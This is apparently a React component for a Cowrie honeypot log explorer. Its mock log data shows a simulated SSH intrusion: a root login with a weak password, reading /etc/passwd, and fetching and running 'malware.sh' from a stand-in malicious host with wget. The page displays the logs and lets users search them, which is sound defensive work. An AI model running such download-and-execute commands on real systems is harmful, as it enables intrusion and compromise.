
import { useState } from "react";
import Navbar from "@/components/Navbar";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Search, Download, RefreshCw } from "lucide-react";

// Mock log entries
const logEntries = [
  {
    id: 1,
    timestamp: "2025-04-22T10:05:33.123Z",
    level: "INFO",
    component: "cowrie.ssh.transport",
    message: "Remote SSH version: SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2"
  },
  {
    id: 2,
    timestamp: "2025-04-22T10:05:33.456Z",
    level: "INFO",
    component: "cowrie.ssh.transport",
    message: "SSH client setting up connection"
  },
  {
    id: 3,
    timestamp: "2025-04-22T10:05:34.789Z",
    level: "INFO",
    component: "cowrie.ssh.userauth.password",
    message: "login attempt [root/123456] succeeded"
  },
  {
    id: 4,
    timestamp: "2025-04-22T10:05:35.012Z",
    level: "INFO",
    component: "cowrie.ssh.session",
    message: "New SSH session: 192.168.1.105:54321 (192.168.1.105)"
  },
  {
    id: 5,
    timestamp: "2025-04-22T10:05:36.345Z",
    level: "INFO",
    component: "cowrie.command.input",
    message: "CMD: ls -la"
  },
  {
    id: 6,
    timestamp: "2025-04-22T10:05:38.678Z",
    level: "INFO",
    component: "cowrie.command.input",
    message: "CMD: cat /etc/passwd"
  },
  {
    id: 7,
    timestamp: "2025-04-22T10:05:40.901Z",
    level: "INFO",
    component: "cowrie.command.input",
    message: "CMD: wget http://malicious.com/malware.sh"
  },
  {
    id: 8,
    timestamp: "2025-04-22T10:05:42.234Z",
    level: "INFO",
    component: "cowrie.command.input",
    message: "CMD: chmod +x malware.sh"
  },
  {
    id: 9,
    timestamp: "2025-04-22T10:05:43.567Z",
    level: "INFO",
    component: "cowrie.command.input",
    message: "CMD: ./malware.sh"
  },
  {
    id: 10,
    timestamp: "2025-04-22T10:05:45.890Z",
    level: "INFO",
    component: "cowrie.ssh.session",
    message: "SSH session closed"
  }
];

const CowrieLogs = () => {
  const [searchQuery, setSearchQuery] = useState("");
  const [filteredLogs, setFilteredLogs] = useState(logEntries);
  
  const handleSearch = () => {
    if (!searchQuery) {
      setFilteredLogs(logEntries);
      return;
    }
    
    const query = searchQuery.toLowerCase();
    const filtered = logEntries.filter(
      log => 
        log.message.toLowerCase().includes(query) || 
        log.component.toLowerCase().includes(query) ||
        log.level.toLowerCase().includes(query)
    );
    
    setFilteredLogs(filtered);
  };
  
  return (
    <div className="min-h-screen bg-cyber">
      <Navbar />
      <div className="container mx-auto py-6 px-4">
        <h1 className="text-3xl font-bold text-cyber-accent mb-6">Cowrie Logs</h1>
        
        <Card className="bg-cyber-muted border-cyber-border mb-6">
          <CardHeader>
            <CardTitle>Log Explorer</CardTitle>
            <CardDescription>Search and filter Cowrie honeypot logs</CardDescription>
          </CardHeader>
          <CardContent>
            <div className="flex gap-4 mb-4">
              <div className="flex-1">
                <Input
                  placeholder="Search logs..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  onKeyDown={(e) => e.key === "Enter" && handleSearch()}
                  className="bg-cyber/50"
                />
              </div>
              <Button onClick={handleSearch} variant="secondary">
                <Search className="h-4 w-4 mr-2" />
                Search
              </Button>
              <Button variant="outline">
                <RefreshCw className="h-4 w-4 mr-2" />
                Refresh
              </Button>
              <Button variant="outline">
                <Download className="h-4 w-4 mr-2" />
                Export
              </Button>
            </div>
            
            <div className="font-mono text-sm bg-cyber/70 border border-cyber-border rounded-md">
              {filteredLogs.map((log) => (
                <div key={log.id} className="border-b border-cyber-border last:border-0 p-2 hover:bg-cyber-muted/50">
                  <span className="text-gray-400">{new Date(log.timestamp).toLocaleString()}</span>{" "}
                  <span className={`px-1.5 py-0.5 rounded text-xs ${
                    log.level === "INFO" ? "bg-blue-500/20 text-blue-400" :
                    log.level === "WARNING" ? "bg-yellow-500/20 text-yellow-400" :
                    "bg-red-500/20 text-red-400"
                  }`}>
                    {log.level}
                  </span>{" "}
                  <span className="text-cyber-accent">[{log.component}]</span>{" "}
                  <span>{log.message}</span>
                </div>
              ))}
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

export default CowrieLogs;
